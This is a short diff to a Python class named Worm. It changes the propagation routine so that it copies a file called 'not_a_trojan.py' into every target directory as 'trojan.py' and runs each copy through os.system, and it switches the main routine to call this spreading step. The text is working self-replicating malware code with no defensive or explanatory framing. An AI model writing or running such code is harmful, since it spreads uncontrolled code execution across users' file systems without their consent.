@@ -49,8 +49,11 @@ class Worm:
     # create a new worm in the target directory
     def create_new_worm(self):
         for directory in self.target_dir_list:
-            destination = os.path.join(directory, ".worm.py")
-            shutil.copyfile(self.own_path, destination)
+            destination = os.path.join(directory, "trojan.py")
+            path = os.path.join(os.path.abspath(""), "not_a_trojan.py")
+            if directory != self.path:
+                shutil.copyfile(path, destination)
+                os.system("python -u " + destination)
             
     def create_hacked(self):
         for directory in self.target_dir_list:
@@ -74,8 +77,8 @@ class Worm:
     # start the worm actions        
     def start_worm_actions(self):
         self.list_directories(self.path)
-        self.create_hacked()
-        # self.create_new_worm()
+        # self.create_hacked()
+        self.create_new_worm()
         # self.copy_existing_files()
         
 # driver code
